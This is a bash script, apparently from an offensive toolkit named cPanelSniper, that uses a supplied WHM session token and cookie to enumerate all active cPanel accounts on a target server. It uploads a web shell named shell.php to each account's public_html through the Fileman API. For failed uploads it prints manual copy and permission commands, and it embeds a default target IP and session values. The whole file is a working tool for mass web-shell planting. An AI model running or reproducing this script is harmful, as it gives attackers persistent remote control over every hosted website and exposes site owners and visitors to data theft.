#!/bin/bash
# Upload shell.php to all accounts via cPanel Fileman API
# Usage: ./upload_via_api.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
SHELL_FILE="/root/cPanelSniper/shell.php"

echo "========================================"
echo "  Upload shell.php via cPanel API"
echo "========================================"
echo ""
echo "Target: https://${WHM_HOST}:2087"
echo "Session: ${SESSION_TOKEN}"
echo ""

# Check shell file
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

# Read shell content
SHELL_CONTENT=$(cat "$SHELL_FILE")
echo "✓ Shell file loaded: $(echo "$SHELL_CONTENT" | wc -c) bytes"
echo ""

# Get list of accounts
echo "[1/3] Listing active accounts..."

ACCOUNTS_JSON=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/listaccts?api.version=1" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded")

if [ $? -ne 0 ]; then
    echo "❌ Failed to connect to WHM"
    exit 1
fi

# Extract active accounts
echo "$ACCOUNTS_JSON" | jq -r '.data.acct[] | select(.suspended == 0) | "\(.user)|\(.domain)|\(.homedir)"' > /tmp/whm_accounts.txt

if [ ! -s /tmp/whm_accounts.txt ]; then
    echo "❌ No active accounts found"
    exit 1
fi

ACCOUNT_COUNT=$(wc -l < /tmp/whm_accounts.txt)
echo "✓ Found $ACCOUNT_COUNT active accounts"
echo ""

# Show accounts
echo "Accounts:"
echo "$ACCOUNTS_JSON" | jq -r '.data.acct[] | select(.suspended == 0) | "  • \(.domain) (\(.user))"'
echo ""

# Confirm
read -p "Continue upload? (y/N): " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Cancelled"
    rm -f /tmp/whm_accounts.txt
    exit 0
fi

echo ""
echo "[2/3] Uploading shell.php..."
echo ""

SUCCESS=0
FAILED=0

# Function to upload to cPanel via API
upload_to_cpanel() {
    local user="$1"
    local domain="$2"
    local content="$3"

    # Use cPanel Fileman API v3
    local result=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
      -H "Cookie: whostmgrsession=${COOKIE}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "cpanel_jsonapi_user=${user}" \
      -d "cpanel_jsonapi_module=Fileman" \
      -d "cpanel_jsonapi_func=savefile" \
      -d "cpanel_jsonapi_apiversion=3" \
      -d "dir=%2Fpublic_html" \
      -d "file=shell.php" \
      -d "fromapi=1" \
      --data-urlencode "content=${content}" 2>/dev/null)

    echo "$result"
}

# Loop through accounts
while IFS='|' read -r user domain homedir; do
    echo "[$((SUCCESS + FAILED + 1))/$ACCOUNT_COUNT] $domain ($user)"

    # Try Method 1: cPanel Fileman API
    RESULT=$(upload_to_cpanel "$user" "$domain" "$SHELL_CONTENT")

    # Check result
    if echo "$RESULT" | jq -e '.cpanelresult.data[0].result == true' > /dev/null 2>&1; then
        echo "  ✅ Uploaded via Fileman API"
        echo "  → https://$domain/shell.php"
        SUCCESS=$((SUCCESS + 1))
        continue
    fi

    # Method 2: Try using file_put_contents via PHP (if we can access cPanel file manager)
    # This requires creating a temp file first

    # Method 3: FTP upload (if credentials available)
    # Need FTP username/password for each user

    echo "  ❌ Failed (API method)"
    echo "  → Try manual upload to $homedir/public_html/"
    FAILED=$((FAILED + 1))

done < /tmp/whm_accounts.txt

echo ""
echo "[3/3] Summary"
echo ""
echo "Success: $SUCCESS/$ACCOUNT_COUNT"
echo "Failed: $FAILED/$ACCOUNT_COUNT"
echo ""

# Generate manual upload commands for failed ones
if [ $FAILED -gt 0 ]; then echo ""
    echo "========================================"
    echo "  Manual Upload Commands"
    echo "========================================"
    echo ""
    echo "Run these commands on the server (if you have direct access):"
    echo ""

    while IFS='|' read -r user domain homedir; do
        echo "# Upload to $domain ($user)"
        echo "cp $SHELL_FILE ${homedir}/public_html/shell.php"
        echo "chown ${user}:${user} ${homedir}/public_html/shell.php"
        echo "chmod 644 ${homedir}/public_html/shell.php"
        echo ""
    done < /tmp/whm_accounts.txt
fi

echo "========================================"
echo "  Upload Complete"
echo "========================================"

# Cleanup
rm -f /tmp/whm_accounts.txt
